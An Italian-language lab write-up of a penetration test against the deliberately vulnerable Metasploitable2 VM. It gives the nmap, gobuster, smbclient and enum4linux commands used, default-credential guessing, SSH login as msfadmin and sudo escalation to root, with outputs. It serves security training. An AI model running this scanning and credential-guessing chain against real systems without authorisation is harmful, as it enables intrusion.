# Metasploitable2 Lab

Laboratorio pratico svolto in ambiente controllato con Kali Linux e Metasploitable2 su VirtualBox.

> Tutti i comandi sono stati eseguiti esclusivamente in un laboratorio locale autorizzato.

---

## 1. Obiettivo del laboratorio

Obiettivo: eseguire una metodologia base di penetration testing su Metasploitable2.

Flusso seguito:

```text
Reconnaissance
Network Discovery
Port Scanning
Service Enumeration
Web Enumeration
SMB Enumeration
Initial Access
Post-Exploitation
Privilege Escalation
```

---

## 2. Ambiente di laboratorio

Macchine utilizzate:

```text
Kali Linux        → macchina attaccante
Metasploitable2   → macchina target vulnerabile
VirtualBox        → ambiente di virtualizzazione
Samsung T7 SSD    → storage laboratorio
```

Configurazione rete:

```text
Kali eth0 → NAT / Internet
Kali eth1 → Host-only / laboratorio

Metasploitable2 eth0 → Host-only / laboratorio
```

IP rilevati:

```text
Kali:             192.168.1.101
Metasploitable2:  192.168.1.100
```

---

## 3. Network Discovery

Comando usato per identificare gli host attivi nella rete Host-only:

```bash
nmap -sn 192.168.1.0/24
```

Risultato:

```text
192.168.1.1    → VirtualBox Host-Only Adapter
192.168.1.100  → Metasploitable2
192.168.1.101  → Kali Linux
```

Target selezionato:

```text
192.168.1.100
```

---

## 4. Port Scanning

Scansione completa delle porte TCP:

```bash
nmap -p- -T4 192.168.1.100
```

Porte aperte rilevate:

```text
21/tcp    ftp
22/tcp    ssh
23/tcp    telnet
25/tcp    smtp
53/tcp    domain
80/tcp    http
111/tcp   rpcbind
139/tcp   netbios-ssn
445/tcp   microsoft-ds
512/tcp   exec
513/tcp   login
514/tcp   shell
1099/tcp  rmiregistry
1524/tcp  ingreslock / bindshell
2049/tcp  nfs
2121/tcp  ftp
3306/tcp  mysql
3632/tcp  distccd
5432/tcp  postgresql
5900/tcp  vnc
6000/tcp  X11
6667/tcp  irc
6697/tcp  ircs-u
8009/tcp  ajp13
8180/tcp  http
```

---

## 5. Service Enumeration

Scansione con script, version detection e OS detection:

```bash
nmap -sC -sV -A -T4 192.168.1.100
```

Servizi principali identificati:

```text
21/tcp   vsftpd 2.3.4
22/tcp   OpenSSH 4.7p1 Debian
23/tcp   Linux telnetd
80/tcp   Apache httpd 2.2.8 Ubuntu DAV/2
139/tcp  Samba
445/tcp  Samba 3.0.20-Debian
1524/tcp Metasploitable root shell
2049/tcp NFS
2121/tcp ProFTPD 1.3.1
3306/tcp MySQL 5.0.51a
5432/tcp PostgreSQL 8.3
5900/tcp VNC
6667/tcp UnrealIRCd
8180/tcp Apache Tomcat/Coyote JSP engine
```

Informazioni sistema:

```text
OS: Linux 2.6.x
Hostname: metasploitable
FQDN: metasploitable.localdomain
```

---

## 6. FTP Enumeration

Servizio rilevato:

```text
21/tcp open ftp vsftpd 2.3.4
Anonymous FTP login allowed
```

Connessione FTP:

```bash
ftp 192.168.1.100
```

Credenziali usate:

```text
Username: anonymous
Password: anonymous
```

Comandi usati dentro FTP:

```text
pwd
ls
dir
bye
```

Risultato:

```text
Login anonymous riuscito.
Directory FTP vuota.
Nessun file utile trovato.
```

Conclusione:

```text
FTP anonymous abilitato, ma nessun backup o file interessante presente.
Servizio da annotare per possibile vulnerabilità nota di vsftpd 2.3.4.
```

---

## 7. Web Enumeration

Fingerprinting web:

```bash
whatweb http://192.168.1.100
curl -I http://192.168.1.100
```

Risultati:

```text
Apache 2.2.8 Ubuntu DAV/2
PHP 5.2.4
Title: Metasploitable2 - Linux
WebDAV presente
```

Controllo metodi HTTP:

```bash
nmap --script http-methods -p 80 192.168.1.100
```

Risultato:

```text
Supported Methods: GET HEAD POST OPTIONS
```

Interpretazione:

```text
PUT non abilitato.
WebDAV presente, ma upload diretto non disponibile sulla porta 80.
```

Directory enumeration:

```bash
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt
```

Directory e file trovati:

```text
.htpasswd       403
.hta            403
.htaccess       403
cgi-bin/        403
dav             301
index.php       200
phpMyAdmin      301
phpinfo.php     200
server-status   403
test            301
twiki           301
```

---

## 8. phpinfo.php Enumeration

Comandi usati:

```bash
curl -s http://192.168.1.100/phpinfo.php | grep -i "document_root"
curl -s http://192.168.1.100/phpinfo.php | grep -i "server_software"
curl -s http://192.168.1.100/phpinfo.php | grep -i "disable_functions"
```

Risultati importanti:

```text
DOCUMENT_ROOT: /var/www/
SERVER_SOFTWARE: Apache/2.2.8 (Ubuntu) DAV/2
disable_functions: no value
```

Interpretazione:

```text
Document root web: /var/www/
Apache e PHP sono versioni vecchie.
Le funzioni PHP non risultano disabilitate.
```

---

## 9. phpMyAdmin Check

Controllo phpMyAdmin:

```bash
curl -I http://192.168.1.100/phpMyAdmin/
```

Risultato:

```text
HTTP/1.1 200 OK
Set-Cookie: phpMyAdmin=...
Content-Type: text/html
```

Interpretazione:

```text
phpMyAdmin è raggiungibile.
La pagina di login è accessibile.
```

Credenziali semplici provate:

```text
root / root
root / password
root / vuoto
admin / admin
```

Risultato:

```text
Accesso non riuscito.
```

Conclusione:

```text
phpMyAdmin raggiungibile, ma accesso non ottenuto con credenziali semplici.
Passare a credential hunting tramite altri servizi.
```

---

## 10. SMB Enumeration

Enumerazione share SMB:

```bash
smbclient -L //192.168.1.100 -N
```

Risultato:

```text
Anonymous login successful

Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
tmp             Disk      oh noes!
opt             Disk
IPC$            IPC       IPC Service
ADMIN$          IPC       IPC Service
```

Enumerazione approfondita:

```bash
enum4linux -a 192.168.1.100
```

Script Nmap SMB:

```bash
nmap --script smb-enum-shares,smb-enum-users -p 139,445 192.168.1.100
nmap --script smb-os-discovery,smb-security-mode -p 139,445 192.168.1.100
```

Risultati importanti:

```text
Samba 3.0.20-Debian
Computer name: metasploitable
Domain name: localdomain
FQDN: metasploitable.localdomain
SMB message signing disabled
Share tmp anonymous READ/WRITE
```

Utenti interessanti enumerati:

```text
msfadmin
user
root
www-data
postgres
mysql
tomcat55
service
backup
ftp
```

---

## 11. Accesso alla share tmp

Connessione alla share:

```bash
smbclient //192.168.1.100/tmp -N
```

Comandi usati:

```text
pwd
ls
dir
exit
```

Contenuto trovato:

```text
.ICE-unix
.X11-unix
.X0-lock
4570.jsvc_up
```

Interpretazione:

```text
La share tmp è accessibile anonimamente.
La share risulta READ/WRITE.
Non sono stati trovati file utili come backup, configurazioni o credenziali.
```

---

## 12. Initial Access via SSH

Durante l’enumerazione SMB è stato identificato l’utente:

```text
msfadmin
```

È stata provata una credenziale nota del laboratorio:

```text
Username: msfadmin
Password: msfadmin
```

Primo tentativo SSH:

```bash
ssh msfadmin@192.168.1.100
```

Errore:

```text
Unable to negotiate with 192.168.1.100 port 22:
no matching host key type found.
Their offer: ssh-rsa,ssh-dss
```

Interpretazione:

```text
Il server SSH del target è vecchio.
Kali moderna blocca alcuni algoritmi legacy.
```

Comando corretto usato:

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.1.100
```

Password:

```text
msfadmin
```

Accesso riuscito:

```text
msfadmin@metasploitable:~$
```

---

## 13. Post-Exploitation Enumeration

Comandi eseguiti dopo accesso SSH:

```bash
whoami
id
hostname
uname -a
ip a
sudo -l
```

Risultati:

```text
whoami: msfadmin
hostname: metasploitable
Kernel: Linux 2.6.24-16-server
IP: 192.168.1.100/24
```

Output importante di `id`:

```text
uid=1000(msfadmin) gid=1000(msfadmin)
groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
```

Output importante di `sudo -l`:

```text
User msfadmin may run the following commands on this host:
    (ALL) ALL
```

Interpretazione:

```text
L’utente msfadmin può eseguire qualsiasi comando come root tramite sudo.
```

---

## 14. Privilege Escalation

Comando usato:

```bash
sudo -i
```

Password:

```text
msfadmin
```

Verifica privilegi:

```bash
whoami
id
hostname
pwd
```

Risultato:

```text
whoami: root
uid=0(root) gid=0(root) groups=0(root)
hostname: metasploitable
pwd: /root
```

Privilege escalation riuscita.

---

## 15. Catena completa dell’attacco

```text
Network discovery
↓
Port scanning
↓
Service enumeration
↓
Web enumeration
↓
SMB enumeration
↓
User discovery: msfadmin
↓
SSH access with known lab credentials
↓
sudo -l
↓
sudo -i
↓
root shell
```

---

## 16. Risultato finale

```text
Target compromesso: sì
Initial access: SSH con msfadmin
Privilege escalation: sudo -i
Privilegio finale: root
```

---

## 17. Lezioni apprese

Punti importanti del laboratorio:

```text
Enumeration prima dell’exploitation
Non saltare direttamente agli exploit
Controllare sempre credenziali note/deboli in laboratorio
SMB può rivelare utenti e share interessanti
phpMyAdmin accessibile non significa automaticamente accesso
sudo -l è fondamentale dopo initial access
Gli algoritmi SSH legacy possono richiedere opzioni specifiche
```

---

## 18. Comandi principali usati

```bash
nmap -sn 192.168.1.0/24
nmap -p- -T4 192.168.1.100
nmap -sC -sV -A -T4 192.168.1.100

ftp 192.168.1.100

whatweb http://192.168.1.100
curl -I http://192.168.1.100
nmap --script http-methods -p 80 192.168.1.100
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt

curl -I http://192.168.1.100/phpMyAdmin/
curl -s http://192.168.1.100/phpinfo.php | grep -i "document_root"
curl -s http://192.168.1.100/phpinfo.php | grep -i "server_software"
curl -s http://192.168.1.100/phpinfo.php | grep -i "disable_functions"

smbclient -L //192.168.1.100 -N
enum4linux -a 192.168.1.100
smbclient //192.168.1.100/tmp -N

nmap --script smb-enum-shares,smb-enum-users -p 139,445 192.168.1.100
nmap --script smb-os-discovery,smb-security-mode -p 139,445 192.168.1.100

ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.1.100

whoami
id
hostname
uname -a
ip a
sudo -l
sudo -i
```

---

## 19. Nota etica

Questo laboratorio è stato svolto esclusivamente su Metasploitable2, una macchina virtuale volutamente vulnerabile, in ambiente locale e autorizzato.

Non utilizzare questi comandi contro sistemi reali senza autorizzazione esplicita.
